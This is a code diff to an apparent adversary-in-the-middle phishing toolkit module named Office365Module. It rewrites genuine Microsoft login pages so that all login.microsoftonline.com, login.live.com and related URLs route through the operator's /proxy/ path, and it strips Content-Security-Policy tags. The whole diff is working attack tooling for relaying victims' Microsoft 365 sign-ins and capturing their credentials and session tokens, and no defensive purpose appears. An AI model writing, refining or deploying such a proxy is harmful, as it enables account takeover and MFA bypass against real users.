@@ -975,39 +975,38 @@ class Office365Module(BaseModule):
                     self.log(f"[AiTM] Processing REAL Microsoft HTML content, size: {len(content_str)} chars")
                     
                     # MINIMAL APPROACH: Only replace Microsoft URLs with proxy URLs
-                    # No CSS forcing, no script removal - let Microsoft handle everything!
                     replacements = [
-                        ('https://login.microsoftonline.com/', f'https://{current_host}/proxy/'),
-                        ('https://login.live.com/', f'https://{current_host}/proxy/'),
-                        ('https://login.microsoft.com/', f'https://{current_host}/proxy/'),
-                        ('https://account.live.com/', f'https://{current_host}/proxy/'),
-                        ('https://account.microsoft.com/', f'https://{current_host}/proxy/'),
-                        ('"https://login.microsoftonline.com', f'"https://{current_host}/proxy'),
-                        ("'https://login.microsoftonline.com", f"'https://{current_host}/proxy"),
-                        ('"https://login.live.com', f'"https://{current_host}/proxy'),
-                        ("'https://login.live.com", f"'https://{current_host}/proxy"),
-                        ('//login.microsoftonline.com/', f'//{current_host}/proxy/'),
-                        ('//login.live.com/', f'//{current_host}/proxy/'),
+                        ('https://login.microsoftonline.com/', '/proxy/'),
+                        ('https://login.live.com/', '/proxy/'),
+                        ('https://login.microsoft.com/', '/proxy/'),
+                        ('https://account.live.com/', '/proxy/'),
+                        ('https://account.microsoft.com/', '/proxy/'),
+                        ('"https://login.microsoftonline.com', '"/proxy'),
+                        ("'https://login.microsoftonline.com", "'/proxy"),
+                        ('"https://login.live.com', '"/proxy'),
+                        ("'https://login.live.com", "'/proxy"),
+                        ('//login.microsoftonline.com/', '/proxy/'),
+                        ('//login.live.com/', '/proxy/'),
                     ]
                     
                     for old_url, new_url in replacements:
                         content_str = content_str.replace(old_url, new_url)
                     
-                    # Remove any inline meta Content-Security-Policy tags to avoid CSP blocking
+                    # Remove any inline meta CSP tags (already present earlier)
                     content_str = re.sub(r'<meta[^>]+http-equiv=["\"]Content-Security-Policy["\"][^>]*>', '', content_str, flags=re.IGNORECASE)
-
-                    # Broad regex-based rewrite for any direct Microsoft URLs we didn't explicitly list (handles df6.cfp.microsoft.com and others)
+                    
+                    # Broad regex rewrite -> /proxy/
                     def _rewrite(match):
                         url = match.group(0)
                         proto_removed = re.sub(r'^https?:\/\/', '', url)
                         path_part = '/'.join(proto_removed.split('/')[1:])
-                        return f"https://{current_host}/proxy/{path_part}"
-
+                        return f"/proxy/{path_part}"
+                    
                     pattern = r"https?:\/\/[A-Za-z0-9\-.]*(live\.com|microsoft\.com)/(?:[A-Za-z0-9_\-./?=&%+]*)"
                     content_str = re.sub(pattern, _rewrite, content_str)
-
+                    
                     content = content_str.encode('utf-8')
-                    self.log(f"[AiTM] Serving REAL Microsoft page with MINIMAL URL rewriting only")
+                    self.log(f"[AiTM] Serving REAL Microsoft page after URL rewrite to /proxy path")
                     
                     # Update Content-Length header
                     response_headers['Content-Length'] = str(len(content))
